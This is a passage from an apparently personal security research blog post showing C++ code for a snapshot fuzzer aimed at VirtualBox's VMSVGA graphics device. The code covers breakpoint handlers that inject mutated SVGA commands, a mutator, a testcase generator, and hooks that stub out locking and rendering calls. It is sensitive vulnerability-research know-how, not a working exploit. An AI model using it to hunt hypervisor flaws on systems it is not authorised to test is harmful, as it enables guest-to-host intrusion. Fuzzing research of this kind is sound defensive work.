Backend-&gt;<span class="built_in">GetArg</span>(<span class="number">0</span>);</span><br><span class="line">  Gva_t pbBounceBuf_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">5</span>);</span><br><span class="line">  Gva_t pcbAlreadyRead_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;cbpayloadReq(&#123;:#x&#125;) &gt; SvgaCmdBodySize(&#123;:#x&#125;), restore context and goto next round\n&quot;</span>, cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    <span class="keyword">return</span> GlobalState.<span class="built_in">RestoreGprs</span>(Backend);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; u32PbBounceBufMaxSize) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> RetAddr = Backend-&gt;<span class="built_in">VirtRead8</span>(<span class="built_in">Gva_t</span>(Backend-&gt;<span class="built_in">Rsp</span>()));</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;check this, RetAddr = &#123;:#x&#125;\n&quot;</span>, RetAddr);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteDirty</span>(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to write pbBounceBuf, pbBounceBuf = &#123;:#x&#125;, cbPayloadReq = &#123;:#x&#125;, SvgaCmdBodySize = &#123;:#x&#125;\n&quot;</span>,</span><br><span class="line">                pbBounceBuf_gva.<span class="built_in">U64</span>(), cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteStructDirty</span>(pcbAlreadyRead_gva, &amp;cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = &#123;:#x&#125;\n&quot;</span>, pcbAlreadyRead_gva.<span class="built_in">U64</span>());</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(pbBounceBuf_gva.<span class="built_in">U64</span>());</span><br><span class="line"></span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I also had to define end point of execution. After some reversing, I found two spots and using it as end point.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopEnd = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24AB</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopEnd, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopEnd\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> Gva_t SvgLoopEnd2 = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24B2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgLoopEnd2, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end2 reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgLoopEnd2\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As I said above, I create a snapshot on <code>vmsvgaR3FifoLoop+4E2</code>. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopStart = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x4e2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopStart, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty! goto next round...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> &amp;Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (Testcase.SvgaCmdCode == <span class="number">1045</span>) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty during cmd filtering! goto next round...\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">Rbx</span>(Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;SvgaCmdCode = &#123;:#x&#125;\n&quot;</span>, Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Testcase.SvgaCmdCode &gt;= <span class="number">1040</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write &#123;:#x&#125; on first DWORD\n&quot;</span>, Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Svga3dCmdSize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(Svga3dCmdSize &gt;= <span class="number">0x200000</span>) &#123;</span><br><span class="line">      fmt::<span class="built_in">print</span>(<span class="string">&quot;Svga3dCmdSize(&#123;:#x&#125;) &gt; cbFIFO, abort\n&quot;</span>, Svga3dCmdSize);</span><br><span class="line">      std::<span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">0</span>], &amp;Svga3dCmdSize, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">4</span>], Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>() + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalState.SvgaCmdBody, Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">  &#125;    </span><br><span class="line"></span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopStart\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After some investigation, I found <code>CreateDeviceEx</code> call in <code>vmsvga3dContextDefine</code> keep causing <strong>CR3 context switching</strong> and I didnâ€™t found any way to handling it using breakpoint handler. So I just blacklisting it( <code>SVGA_3D_CMD_CONTEXT_DEFINE</code> &#x3D; <code>1045</code> ).</p><p>I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CustomMutator_t</span><span class="params">(std::mt19937_64 &amp;Rng, <span class="type">const</span> <span class="type">size_t</span> TestcaseMaxSize)</span></span></span><br><span class="line"><span class="function">  : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set maximum size for multiple (mutated) testcase( Default = 1MB )</span></span><br><span class="line">    ScratchBuffer__ = std::<span class="built_in">make_unique</span>&lt;<span class="type">uint8_t</span>[]&gt;(_1MB);</span><br><span class="line">    ScratchBuffer_  = &#123;ScratchBuffer__.<span class="built_in">get</span>(), _1MB&#125;;</span><br><span class="line"></span><br><span class="line">    BodyMutator_ = <span class="built_in">make_unique</span>&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip for brevity...</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">Mutate</span><span class="params">(<span class="type">uint8_t</span> *Data, <span class="type">const</span> <span class="type">size_t</span> DataLen, <span class="type">const</span> <span class="type">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> Root = <span class="built_in">Deserialize</span>(Data, DataLen);</span><br><span class="line">  <span class="keyword">auto</span> &amp;SvgaCmds = Root.SvgaCmds;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;SvgaCmd : SvgaCmds) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 50%</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">1</span>) &#123;  </span><br><span class="line">      <span class="type">uint32_t</span> SvgaCmdRandomIdx = <span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen);</span><br><span class="line">      SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">data</span>(), SvgaCmd.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> NewTestcaseSize = BodyMutator_-&gt;Mut_.<span class="built_in">Mutate</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">size</span>(), MaxSize);</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(NewTestcaseSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(SvgaCmd.SvgaBody.<span class="built_in">data</span>(), GlobalMutBuffer, NewTestcaseSize);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I also define generator function. It is very useful if you are too lazy to create random input like me ^~^.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">GenerateTestcase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SvgaCmds_t Root;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> N = <span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> Idx = <span class="number">0</span>; Idx &lt; N; Idx++) &#123;</span><br><span class="line">    SvgaCmd_t SvgaCmd;</span><br><span class="line">    </span><br><span class="line">    SvgaCmd.SvgaCmdCode = SvgaCmdList[<span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen)];</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(<span class="built_in">GetUint32</span>(<span class="number">0x100</span>, <span class="number">0x400</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = <span class="number">0x41</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = (<span class="type">uint8_t</span>)<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Root.SvgaCmds.<span class="built_in">emplace_back</span>(SvgaCmd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetNewTestcase</span><span class="params">(<span class="type">const</span> Corpus_t &amp;Corpus)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 20%</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">5</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> Testcase_t *Testcase = Corpus.<span class="built_in">PickTestcase</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Testcase) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;The corpus is empty, generate random one\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Copy the input in a buffer we&#x27;re going to mutate.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;Buffer_.<span class="built_in">get</span>(),</span><br><span class="line">         Testcase-&gt;BufferSize_);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_);</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Mutate</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - <span class="built_in">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module.</p><p>â€¦..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of <code>Init()</code> function.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetupVBoxBlacklistHooks</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!RTLogLoggerEx&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxVMM!PDMCritSectLeave&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::acquire&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!SUPSemEventWaitNoResume&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CBaseDevice::Release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CD3DBase::Clear&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;USER32!GetDC&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0x1337</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on 